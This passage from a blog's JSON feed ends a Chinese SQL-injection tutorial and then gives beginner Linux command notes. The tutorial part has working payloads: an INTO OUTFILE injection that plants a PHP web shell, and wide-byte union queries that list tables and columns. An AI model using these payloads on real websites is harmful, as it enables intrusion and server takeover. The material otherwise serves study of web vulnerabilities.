user_id，使用其他注入方式</p>\n<p>类似的，<strong>请求头的各个位置都有可能可以注入</strong></p>\n<h2 id=\"八outfile_sql注入\"><a class=\"anchor\" href=\"#八outfile_sql注入\">#</a> 八.outfile_sql 注入</h2>\n<p><strong>MySQL 如果没有写入权限，想都不要想这玩意儿</strong></p>\n<p>这是一个关键字，基本语法</p>\n<pre><code class=\"language-mysql\">SELECT ... INTO OUTFILE \n</code></pre>\n<p>于是可以：</p>\n<pre><code class=\"language-mysql\">1;SELECT '&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'; --\n</code></pre>\n<p>这样，如果我们执行了这个 php 文件（所以你写的必须放在这个网站的根目录，通常是 /var/www/html/），就可以使用</p>\n<p><code>http://example.com/shell.php?cmd=ls</code>  来执行系统命令。</p>\n<p>万一不知道路径？</p>\n<p>可以先联合注入：</p>\n<pre><code class=\"language-mysql\">'union select 1,@@basedir,@@datadir #\n</code></pre>\n<p><code>@@basedir</code> \t系统变量，是 MySQL 的安装路径</p>\n<p><code>@@datadir</code> \t系统变量，是 MySQL 的文件路径</p>\n<p>（都是绝对路径）</p>\n<p>EX. 配置环境</p>\n<p>在 MYSQL 安装目录下的 my.ini，增加一个：secure-file-priv=&quot;&quot;</p>\n<p><strong>重启生效</strong></p>\n<p>可以用 sql 命令：</p>\n<p>show variables like &quot;secure_file_priv&quot; 或 show variables like &quot;secure_file_priv&quot;</p>\n<p>来查看当前设置，NULL 表示禁止导入导出，空表示不限制，</p>\n<p>若值为 /tmp/，表示限制 mysqld 的导入、导出只能发生在 /tmp/ 目录</p>\n<h2 id=\"九宽字节注入\"><a class=\"anchor\" href=\"#九宽字节注入\">#</a> 九。宽字节注入</h2>\n<p>仅限数据库时 GBK 编码和后端进行 \\ 转义</p>\n<p>此时闭合用的 %27（单引号）改成 % df%27（GBK 编码下是个汉字）</p>\n<p>因为汉字双字节，所以 PHP 转义的 \\ 会被吃掉</p>\n<p>然后联合查询</p>\n<p>注意：由于 ' 被转义</p>\n<p>table_schema=' 库名'</p>\n<p>要改为嵌套查询</p>\n<p>table_schema=(select database())</p>\n<p>例如：</p>\n<pre><code class=\"language-mysql\">id=20%df%27union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(selectdatabase())%23\n-- 查列\n</code></pre>\n<blockquote>\n<pre><code class=\"language-mysql\">id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema=(selectdatabase()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1%23\n</code></pre>\n</blockquote>\n<blockquote>\n<p>这里就使用了三层嵌套，第一层是 table_schema，它代表库名的嵌套，第二层和第三层是 table_name 的嵌套，这里可以看到语句中有两个 limit，前一个 limit 控制表名的顺序，后一个则控制字段名的顺序。这里就可以查询到表中的字段信息，剩下的就是查询详细信息，这里就不做介绍</p>\n</blockquote>\n<p>在 PHP 中，通过 iconv () 进行编码转换时，也可能存在宽字符注入漏洞</p>\n",
            "tags": [
                "技术",
                "SQL"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2025/01/22/Linux/",
            "url": "https://zhewanyiershinicheng.github.io/2025/01/22/Linux/",
            "title": "Linux",
            "date_published": "2025-01-22T13:57:23.000Z",
            "content_html": "<h2 id=\"零一般命令\"><a class=\"anchor\" href=\"#零一般命令\">#</a> 零。一般命令：</h2>\n<h3 id=\"0echo\"><a class=\"anchor\" href=\"#0echo\">#</a> 0.echo</h3>\n<p>输出到终端</p>\n<p>可选参数：</p>\n<p>-n\t不换行输出</p>\n<p>-e\t启用转义，像是 \\n（换行）</p>\n<h3 id=\"1cd\"><a class=\"anchor\" href=\"#1cd\">#</a> <a href=\"http://1.cd\">1.cd</a></h3>\n<p><code>cd ~</code> \t命令返回 /home</p>\n<p><code>cd -</code> \t命令可以在当前目录和上一个目录之前来回切换</p>\n<h3 id=\"2ls\"><a class=\"anchor\" href=\"#2ls\">#</a> <a href=\"http://2.ls\">2.ls</a></h3>\n<pre><code>zl@LAPTOP-ZL ~/rust_learn&gt; ls -l\ntotal 2412\ndrwxrwxrwx 1 zl   zl      4096 Sep  9 22:43 branches/\ndrwxrwxrwx 1 zl   zl      4096 Sep 18 14:44 defining_enum/\ndrwxrwxrwx 1 zl   zl      4096 Sep  9 22:01 functions/\ndrwxrwxrwx 1 zl   zl      4096 Sep  6 12:50 guessing_game/\ndrwxrwxrwx 1 zl   zl      4096 Sep  6 12:13 hello_cargo/\ndrwxrwxrwx 1 zl   zl      4096 Sep  9 23:06 loops/\n-rwxrwxrwx 1 zl   zl   2469128 Sep  6 11:54 main*\n-rw-r--r-- 1 root root      45 Sep  6 11:54 main.rs\ndrwxrwxrwx 1 zl   zl      4096 Sep 18 15:51 match_control_flow/\ndrwxrwxrwx 1 zl   zl      4096 Sep 11 20:07 ownership/\ndrwxrwxrwx 1 zl   zl      4096 Sep 17 23:55 rectangles/\ndrwxrwxrwx 1 zl   zl      4096 Sep 12 13:31 references_and_borrowing/\ndrwxrwxrwx 1 zl   zl      4096 Sep 17 23:20 structure/\ndrwxrwxrwx 1 zl   zl      4096 Sep 12 14:42 the_slice_type/\ndrwxrwxrwx 1 zl   zl      4096 Sep  9 09:05 variables/\n</code></pre>\n<blockquote>\n<ol>\n<li>首字母 d 表示是一个 directory（目录）</li>\n<li>前三个字母组，表示 owner of the file 的权限（拥有者）</li>\n<li>中间三个字母组，表示 group of the file 的权限（所在的组）</li>\n<li>最后三个字母组，表示 anyone else 的权限（其他人）</li>\n</ol>\n<ul>\n<li>\n<p>后边的第一个 zl 表示 owner（显示的就是名字），第二个 zl 表示 group（那个用户所在的组）。</p>\n</li>\n<li>\n<p>三个字母的意思：</p>\n<p>read  （读，可以用 cat,less,more 等命令来查看其内容）</p>\n<p>write（写，对于目录，就是可以创建，删除和重命名，但是你必须同时也有那个文件的权限。对于文件，可以使用文本编辑器（vim,nano 等）来修改它，也可以删除它（实际上是修改目录信息））</p>\n<p>execute（执行，对于目录来说，就是否可以打开它）。</p>\n<p>注意：即使对目录有读权限，如果没有执行权限，也无法进入目录，并且会收到  <code>Permission denied</code>  的错误。</p>\n</li>\n</ul>\n</blockquote>\n<p>举个例子：</p>\n<p><code>-rwxr-xr--</code>  表示：</p>\n<ul>\n<li>这是一个普通文件。</li>\n<li>文件所有者具有读、写、执行权限。</li>\n<li>文件所属组具有读、执行权限，但没有写权限。</li>\n<li>其他用户仅具有读权限。</li>\n</ul>\n<h3 id=\"3rmdir\"><a class=\"anchor\" href=\"#3rmdir\">#</a> 3.rmdir</h3>\n<p>删除文件夹，只用为空时才可以</p>\n<h3 id=\"4cattac\"><a class=\"anchor\" href=\"#4cattac\">#</a> 4.cat/tac</h3>\n<p>打开文件 / 逆序打开文件</p>\n<p>格式有：</p>\n<p><code>cat filename</code> ,  <code>cat &lt; filename</code></p>\n<p>此时可能会出现</p>\n<pre><code>cat &lt; main.rs &gt; test.rs\n将main.rs中的内容覆盖到test.rs中\n</code></pre>\n<p>其中 <code>&gt;</code>  是重定向了该命令</p>\n<p>它会将前面命令的输出写入到指向的文件（会清空原有内容，是覆盖操作）</p>\n<p><em><strong>如果文件不存在，这会创建一个新的文件</strong></em></p>\n<p>如果不想覆盖，使用 <code>&gt;&gt;</code>  来追加重定向，此时内容只会追加到指向文件的末尾</p>\n<h4 id=\"tac可选参数\"><a class=\"anchor\" href=\"#tac可选参数\">#</a> tac 可选参数</h4>\n<p>-b\t指定分隔符，默认换行符</p>\n<p>-r\t将分隔符解释为正则表达式</p>\n<p>-s\t指定分割符的字符串，覆盖默认的换行符</p>\n<p>// 不指定文件时，tac 会从键盘获取，输入后按 <code>ctrl + D</code> , 即可逆序显示</p>\n<h3 id=\"5rm\"><a class=\"anchor\" href=\"#5rm\">#</a> 5.rm</h3>\n<p>删除</p>\n<h3 id=\"6mv\"><a class=\"anchor\" href=\"#6mv\">#</a> <a href=\"http://6.mv\">6.mv</a></h3>\n<p>移动 &amp; 重命名，注意实际上这是个覆盖操作</p>\n<h3 id=\"7touch\"><a class=\"anchor\" href=\"#7touch\">#</a> 7.touch</h3>\n<p>主要功能是修改文件的时间戳，若指定的文件不存在，它会创建空文件</p>\n<p>同时创建多个，空格分隔</p>\n<p>可选参数：</p>\n<p>-a\t仅修改访问时间</p>\n<p>-m\t仅修改修改时间</p>\n<p><strong>-c\t不存在时也不创建</strong></p>\n<p>-d\t修改当前时间戳，格式 xxxx-xx-xx xx:xx:xx</p>\n<p>-t\t修改文件时间，格式 xxxxxxxxxxxxxx</p>\n<p>例如：  <code>202412312359</code>  代表 2024 年 12 月 31 日 23 时 59 分</p>\n<h2 id=\"一工具或是脚本用命令\"><a class=\"anchor\" href=\"#一工具或是脚本用命令\">#</a> 一。工具，或是脚本用命令：</h2>\n<h3 id=\"1赋值与输出\"><a class=\"anchor\" href=\"#1赋值与输出\">#</a> 1. 赋值与输出</h3>\n<p>赋值： <code>foo=bar</code>  可以使用指令输出赋值，比如：  <code>foo=$(pwd) </code></p>\n<p>// <code>pwd</code>  显示当前工作目录</p>\n<p>输出： <code>echo $foo</code>  或者  <code>echo &quot;$foo&quot;</code>  , 以及 <code>tee</code></p>\n<p>// <code>tee</code>  要用 |, 因为它后面跟的的要输出到的文件</p>\n<p>例如:</p>\n<pre><code>echo &quot;Hello world&quot; | tee test.rs\n比起单纯用&gt;,它可以提权后使用，用于写入一些需要更高权限的文件\n</code></pre>\n<p>// 但是不能 <code>echo '$foo'</code> , 因为单引号内的全部都会被视为字面值。</p>\n<h3 id=\"2source\"><a class=\"anchor\" href=\"#2source\">#</a> 2.source</h3>\n<p>执行文件内的指令，同时也将里面的函数添加到 shell 中</p>\n<p>例如：</p>\n<pre><code># mcd.sh\nmcd () &#123;\n    mkdir -p &quot;$1&quot;\n    cd &quot;$1&quot;\n&#125;\nsource mcd.sh\nmcd test\n</code></pre>\n<h3 id=\"3bash中的特定变量\"><a class=\"anchor\" href=\"#3bash中的特定变量\">#</a> 3.bash 中的特定变量</h3>\n<p><code>!!</code> \t显示完整的上一条指令</p>\n<p><code>$1 ~ $9</code> \t第一个和之后的变量</p>\n<p><code>$_</code> \t上一条命令的最后一个变量，使用快捷键 <code>Esc+.</code>  自动输入这玩意</p>\n<p>（注意：每条命令自身前面有 $，说明其也是一个变量）</p>\n<p><code>$?</code> \t前一条指令的退出状态码</p>\n<p>// 成功执行为 0，1 是一般错误（包括参数错误等），2 是语法错误，127 是不存在该命令</p>\n<p><code>$$</code> \t当前脚本的 PID</p>\n<p><code>$0</code> \t当前脚本名称</p>\n<p><code>$@</code> \t所有参数</p>\n<blockquote>\n<p>它会传递该脚本或函数的所有参数列表，用于遍历和操作。它和 <code>$*</code>  的意义类似，但是当使用 <code>“ ”</code>  时， <code>$*</code>  会当作整体字符串，但是 <code>$@</code> 是单独的。</p>\n<p>（ <code>$*</code>  的整体字符串的分割符是 $IFS （内部字段分隔符，默认为空格） ）</p>\n</blockquote>\n<h3 id=\"4字符匹配\"><a class=\"anchor\" href=\"#4字符匹配\">#</a> 4. 字符匹配</h3>\n<p><code>?</code> \t只匹配任意一个字符</p>\n<p><code>*</code> \t通配符</p>\n<h3 id=\"5diff\"><a class=\"anchor\" href=\"#5diff\">#</a> 5.diff</h3>\n<p>展示两个文件的不同</p>\n<pre><code>diff file1 file2\n例如：diff &lt;(ls foo/) &lt;(ls bar/)\n</code></pre>\n<h3 id=\"6使用环境变量来解析脚本\"><a class=\"anchor\" href=\"#6使用环境变量来解析脚本\">#</a> 6. 使用环境变量来解析脚本</h3>\n<p>写在脚本首行</p>\n<pre><code>#!/usr/bin/env python\n//这是在环境变量中找python解释器\n</code></pre>\n<h3 id=\"7findfd\"><a class=\"anchor\" href=\"#7findfd\">#</a> 7.find/fd</h3>\n<pre><code>find . -name src -type d\n//.表示在当前文件夹搜索，src是文件名称，d是类型，即文件夹\n如果不是文件夹，可以直接接操作（-exec），例如：\nfind . -name '*.tmp' -exec rm &#123;&#125; \\;\n</code></pre>\n<h3 id=\"8grepripgreprg\"><a class=\"anchor\" href=\"#8grepripgreprg\">#</a> 8.grep/ripgrep/rg</h3>\n<pre><code>grep foobar mcd.sh //在mcd.sh中搜索\ngrep -R foobar . //.同find里的，-R表示递归搜索，使用rg则是默认递归\nrg -w recursion . //.同上，-w表示搜索特定单词\n//-i表示忽略大小写\n</code></pre>\n<h4 id=\"grep的可选参数\"><a class=\"anchor\" href=\"#grep的可选参数\">#</a>  <code>grep</code>  的可选参数：</h4>\n<p>-v\t反检索，只显示不匹配的行</p>\n<p>-c\t只显示匹配的行数，但是不输出内容</p>\n<p>-l/L\t 打印匹配 / 不匹配模板的文件清单</p>\n<p>-s\t不显示错误信息</p>\n<p>-A/B/C\t 查找某些字符的内容，并下 / 上 / 下和上延伸指定行数。</p>\n<p>例如：</p>\n<pre><code>grep 'test' file.txt：在 file.txt 中查找包含 test 的行。\ngrep -i 'test' file.txt：在 file.txt 中不区分大小写查找包含 test 的行。\ngrep -r 'test'.：在当前目录及其子目录中查找包含 test 的行。\n</code></pre>\n<h3 id=\"9fzf\"><a class=\"anchor\" href=\"#9fzf\">#</a> 9.fzf</h3>\n<p><a href=\"https://github.com/junegunn/fzf#using-linux-package-managers\">需要自己安装</a></p>\n<p>模糊搜索</p>\n<pre><code>cat example.sh | fzf\n</code></pre>\n<p>绑定 <code>ctrl + R</code>  后才能在历史搜索中找到它</p>\n<h3 id=\"10moreless\"><a class=\"anchor\" href=\"#10moreless\">#</a> 10.more/less</h3>\n<p><code>more</code>  分页显示大文本文件的内容，逐页阅读。</p>\n<p><code>less</code>  分页显示文本文件内容，可前后移动、搜索和编辑，处理大文件性能好。</p>\n<h4 id=\"more的可选参数\"><a class=\"anchor\" href=\"#more的可选参数\">#</a>  <code>more</code>  的可选参数：</h4>\n<p>-num\t一次显示的行数</p>\n<p>-d\t显示提示信息（如果操作错误）</p>\n<p>-l\t遇见特殊字符 ^L 时不会再暂停</p>\n<p>-f\t计算行数时用实际上的行数</p>\n<p>-p\t显示前先清屏</p>\n<p>-c\t显示后清除其他旧资料</p>\n<p>-s\t多空行只显示一行</p>\n<p>-u\t不显示行号</p>\n<p>+/pattern\t显示前搜寻该字串，从它之后开始显示</p>\n<p>+number\t从第 num 行开始显示</p>\n<h4 id=\"less的可选参数\"><a class=\"anchor\" href=\"#less的可选参数\">#</a>  <code>less</code>  的可选参数：</h4>\n<p>-N\t显示行号</p>\n<p>-S\t禁止水平滚动（会截断长行）</p>\n<p>-F\t内容少于一屏就直接退出</p>\n<p>-X\t不适用终端配置，用于脚本</p>\n<p>-i\t忽略大小写搜索</p>\n<p>-m\t显示剩余行数</p>\n<p>-r\t显示特殊字符</p>\n<p>-z -4\t设置每屏最小行数</p>\n<p>-b num\t设置缓冲区大小</p>\n<p>-e\t显示后自动退出</p>\n<p>-g\t只标记最后搜索的关键词</p>\n<p>-o filename\t将内容输出到文件</p>\n<p>-Q\t不使用警告音</p>\n<p>-s\t含义同 <code>more</code>  中</p>\n<p>-x num\t规定 Tab 键为 num 个空格</p>\n<p>（大多数应该是通用的）</p>\n<p>例如：</p>\n<pre><code>more -s testfile：逐页显示 testfile 的内容，连续空白行合并。\nmore +20 testfile：从第 20 行开始显示 testfile 的内容。\nless example.txt：查看文件内容。\nless +20 example.txt：从第 20 行开始显示文件内容。\nless -N example.txt：显示文件内容并显示行号。\n</code></pre>\n<h3 id=\"11headtail\"><a class=\"anchor\" href=\"#11headtail\">#</a> 11.head/tail</h3>\n<p><code>head</code>  显示文件开头部分</p>\n<p><code>tail</code>  显示文件末尾部分，一般用于看日志</p>\n<h4 id=\"head可选参数\"><a class=\"anchor\" href=\"#head可选参数\">#</a> head 可选参数：</h4>\n<p>-n\t指定行数</p>\n<p>-c\t指定字节数</p>\n<p>例如：</p>\n<pre><code>head file.txt：默认显示文件的前 10 行。\nhead -n 5 file.txt：显示文件的前 5 行。\n</code></pre>\n<h4 id=\"tail另外的可选参数\"><a class=\"anchor\" href=\"#tail另外的可选参数\">#</a> tail 另外的可选参数：</h4>\n<p>-f\t循环读取，追踪更新</p>\n<p>-q/v\t不显示 / 显示详细处理信息</p>\n<p>--pid=pid\t与 - f 合用，和该进程一起挂掉</p>\n<p>-s\t与 - f 合用，每次循环读取间隔 s 秒</p>\n<h3 id=\"12sleep\"><a class=\"anchor\" href=\"#12sleep\">#</a> 12.sleep</h3>\n<p>让脚本或程序暂停执行一段时间，起到延时的作用</p>\n<p>可选单位：</p>\n<ul>\n<li>\n<p><code>s</code> ：秒</p>\n</li>\n<li>\n<p><code>m</code> ：分钟</p>\n</li>\n<li>\n<p><code>h</code> ：小时</p>\n</li>\n<li>\n<p><code>d</code> ：天</p>\n<p>默认是秒</p>\n</li>\n</ul>\n<h2 id=\"二命令符\"><a class=\"anchor\" href=\"#二命令符\">#</a> 二。命令符：</h2>\n<h3 id=\"1和\"><a class=\"anchor\" href=\"#1和\">#</a> 1.&gt; 和 &gt;&gt;</h3>\n<p>见 cat 命令</p>\n<h3 id=\"2pipe\"><a class=\"anchor\" href=\"#2pipe\">#</a> 2.|（pipe）</h3>\n<p>管道符</p>\n<p>将左侧的程序的输出当作右侧的程序的输入</p>\n<p>例如：</p>\n<pre><code>ls -l | tail -n2   //tail -n +&lt;N&gt; 表示输出从第N行开始的内容\n</code></pre>\n<p>常常配合 grep 使用</p>\n<p>例如：</p>\n<pre><code>curl --head --silent baidu.com | grep Server\n//curl用于传输数据。head就是只获取头文件，silent是静默运行，不显示\n进度或错误，只输出结果。grep是筛选命令，只输出包含Server的行\n</code></pre>\n<p>以及</p>\n<pre><code>pstree -ap | grep fish\n//pstree显示进程树a表示每个进程的显示完整命令行，而不只是名称\np表示显示PID(进程标识符)\n</code></pre>\n<p>注意：</p>\n<p>对于需要更高权限才能操作的文件，| 之后的命令需要提权</p>\n<p>比如</p>\n<pre><code>sudo echo 3 &gt; brightness //这样不行\necho 3 | sudo tee brightness //要这样\n//tee命令会将输入写入文件并打印到标准输出。\n另外还有一种写法：\nsudo sh -c &quot;echo 3 &gt; brightness&quot;\n//这可以使得双引号内的所有命令都获得权限\n//sh 是命令行的解释器，-c 是将后面的字符串当作命令来执行(Linux下的脚本文件，就是.sh)\n</code></pre>\n<h2 id=\"三快捷键\"><a class=\"anchor\" href=\"#三快捷键\">#</a> 三。快捷键：</h2>\n<h3 id=\"1ctrl-lclean\"><a class=\"anchor\" href=\"#1ctrl-lclean\">#</a> 1.ctrl + l（clean）</h3>\n<p>等同于命令 <code>clean</code> , 相当于 windows 下的 <code>cls</code> , 清屏</p>\n<h3 id=\"2ctrl-rhistory\"><a class=\"anchor\" href=\"#2ctrl-rhistory\">#</a> 2.ctrl + R（history）</h3>\n<p>等同于命令 <code>history</code> , 显示历史指令</p>\n<pre><code>history n  //展示最后n条结果,通常会和grep配合\n</code></pre>\n<h2 id=\"四vim先留空\"><a class=\"anchor\" href=\"#四vim先留空\">#</a> 四.Vim（先留空）</h2>\n<h2 id=\"五nano\"><a class=\"anchor\" href=\"#五nano\">#</a> 五.Nano</h2>\n<p>比较重要的：</p>\n<ol>\n<li>移动光标，如果要使用方向键，要按着 <code>ctrl</code></li>\n<li>大多数快捷键，下面都有显示，自己看</li>\n<li>nano -Y    启用语法高亮和自带缩进</li>\n</ol>\n<h2 id=\"六学长的奇怪要求\"><a class=\"anchor\" href=\"#六学长的奇怪要求\">#</a> 六。学长的奇怪要求 (?)</h2>\n<h3 id=\"学长的奇妙问题\"><a class=\"anchor\" href=\"#学长的奇妙问题\">#</a> 学长的奇妙问题：</h3>\n<p>问题一：目录符号都有哪些？用途是啥？</p>\n<blockquote>\n<p>.\t当前目录</p>\n<dl>\n<dt>..\t父目录</dt>\n<dd>主目录</dd>\n</dl>\n<p>/\t路径分隔符</p>\n<p>* 和？也算（AI 是这么说的）</p>\n</blockquote>\n<p>问题二：什么是绝对目录？什么是相对目录？</p>\n<blockquote>\n<p>从根目录开始就是绝对目录</p>\n<p>从当前文件夹开始就是相对</p>\n</blockquote>\n<p>问题三：管道符？重定向命令？他们是啥？有何作用？</p>\n<blockquote>\n<p>上面有</p>\n</blockquote>\n<p>问题四：如何查看当前所在目录？如何切换目录？如何查看目录下都有什么内容？</p>\n<blockquote>\n<p>pwd,cd,ls</p>\n</blockquote>\n<p>问题五：如何创建文件？如何移动文件？如何重命名文件？如何删除文件？如何查看文件内容？如何运行可执行文件？</p>\n<blockquote>\n<p>使用管道符（？）/touch,mv,mv,rm,cat/less/more/head/tail/tac, <code>./</code>  前缀（实际上就是给个路径？脚本可以用 source）</p>\n</blockquote>\n<p>问题六：如何创建文件夹？如何删除空文件夹？如何删除非空文件夹？</p>\n<blockquote>\n<p>mkdir,rmdir,rm -r/R -f（windows 下才是 rd /s）</p>\n</blockquote>\n<p>问题七： <code>tac</code>  命令？ <code>echo</code>  命令？ <code>sleep</code>  命令？</p>\n<blockquote>\n<p>见上</p>\n</blockquote>\n<h3 id=\"学长的奇妙作业\"><a class=\"anchor\" href=\"#学长的奇妙作业\">#</a> 学长的奇妙作业：</h3>\n<ul>\n<li>在根目录创建一个 <code>flag</code>  文件</li>\n<li>向刚刚创建的 <code>flag</code>  文件写入 <code>flag&#123;test_flag&#125;</code></li>\n<li>向 <code>flag</code>  文件追加写入 <code>flag&#123;test_flag2&#125;</code></li>\n<li>最后再向 <code>flag</code>  文件覆盖写入 <code>flag&#123;really_flag&#125;</code></li>\n<li>查看当前工作目录</li>\n<li>移动当前工作目录至根目录</li>\n<li>查看根目录下都有什么文件夹和文件</li>\n<li>移动 <code>flag</code>  文件至根目录下的 <code>home</code>  文件夹并重命名为 <code>fllllll4g</code></li>\n<li>查看 <code>fllllll4g</code>  文件内容</li>\n<li>查看 <code>fllllll4g</code>  文件以 base64 编码后的结果</li>\n<li>删除 <code>fllllll4g</code>  文件</li>\n</ul>\n<h4 id=\"base64\"><a class=\"anchor\" href=\"#base64\">#</a> base64</h4>\n<p>base64 编码，可以直接用 base64 命令（确实有这玩意儿）</p>\n<p>// 使用 - d 参数改为解码</p>\n<p>所以可以。。。。。。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"这里替换为Base64编码字符串\"</span> <span class=\"token operator\">|</span> base64 <span class=\"token parameter variable\">-d</span> <span class=\"token operator\">></span> decoded_fllllll4g</pre></td></tr></table></figure><p>七。其他东西</p>\n<p>1.od</p>\n<p>用于以八进制、十进制、十六进制等不同格式显示文件的内容，常用于查看二进制文件，也能查看文本文件。通过不同选项可以指定输出格式和显示范围。</p>\n<p>可选参数：</p>\n<p>-t\t指定格式，c 是字符格式，x 是十六进制，d 是十进制</p>\n<p>注意要写为类似于 <code>-tc</code>  的格式</p>\n<p>2.hexdump</p>\n<p>专门用于以十六进制格式显示文件内容，同时会显示对应的 ASCII 字符，对于分析二进制文件、查看文件的十六进制编码很有帮助。</p>\n<p>可选参数：</p>\n<p>-C\t以标准 16 进制和 ASCll 码对照格式输出</p>\n<p>实际效果类似于 od -tc</p>\n<p>3.grep</p>\n<p>是的，这东西真的可以，瞎搜就行</p>\n<p>例如：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'server'</span> config.txt</pre></td></tr></table></figure><p>4.awk</p>\n<p>一种强大的文本处理工具，可以按行读取文件，对每行内容进行处理和分析。它支持对字段进行分割、提取、计算等操作，常用于数据处理和报表生成。</p>\n<p>格式：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'模式 &#123;动作&#125;'</span> 文件名</pre></td></tr></table></figure><p>示例：假设  <code>data.txt</code>  文件内容是用空格分隔的表格数据，要输出每行的第一个字段，可以使用以下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'&#123;print $1&#125;'</span> data.txt </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//全部输出就直接<span class=\"token punctuation\">&#123;</span>print<span class=\"token punctuation\">&#125;</span>，另外，<span class=\"token variable\">$0</span>表示整行</pre></td></tr></table></figure><p>可以用条件过滤行：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'$3 > 80 &#123;print&#125;'</span> score.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//只输出第三列大于80的</pre></td></tr></table></figure><p>可以求列和：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">awk</span> <span class=\"token string\">'&#123;sum += $2&#125; END &#123;print sum&#125;'</span> sales.txt</pre></td></tr></table></figure><p>// <code>END</code>  是一个特殊的模式，表示在处理完所有行后执行相应的动作，这里用于输出总和。</p>\n<p>5.sed</p>\n<p>一个文本处理工具</p>\n<p>格式</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token string\">'命令'</span> 文件名</pre></td></tr></table></figure><p>替换文本</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token string\">'s/apple/banana/g'</span> text.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//s表示替换操作，g表示全局替换</pre></td></tr></table></figure><p>删除指定行</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token string\">'5,10d'</span> log.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//d表示删除操作，<span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token number\">5,10</span><span class=\"token variable\">`</span></span>表示行号范围</pre></td></tr></table></figure><p>插入文本</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token string\">'3a New line'</span> info.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//a表示在指定行后面追加</pre></td></tr></table></figure><p>然而如果只是像输出其内容，命令留空</p>\n<p>或者</p>\n<blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token string\">'p'</span> example.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>为了避免输出重复，用-n</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'p'</span> example.txt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这样可以进一步，显示指定行</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'5p'</span> example.txt</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>多行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'3,5p'</span> example.txt</pre></td></tr></table></figure></blockquote>\n<p>还可以<strong>匹配内容</strong>，类型于 grep</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'/error/p'</span> log.txt </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//显示所有包含error的行</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>//这里 /error/ 就是一个模式，sed 会查找文件中所有匹配该模式的行，并使用 p 命令将其打印出来</pre></td></tr></table></figure>",
            "tags": [
                "技术",
                "Linux"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/15/%E4%B8%8D%E6%98%AF%EF%BC%8C%E5%BE%AE%E8%BD%AF%EF%BC%8C%E4%BD%A0%E6%9D%A5%E7%9C%9F%E7%9A%84%EF%BC%9F/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/15/%E4%B8%8D%E6%98%AF%EF%BC%8C%E5%BE%AE%E8%BD%AF%EF%BC%8C%E4%BD%A0%E6%9D%A5%E7%9C%9F%E7%9A%84%EF%BC%9F/",
            "title": "不是，微软，你来真的？",
            "date_published": "2024-10-15T15:44:01.000Z",
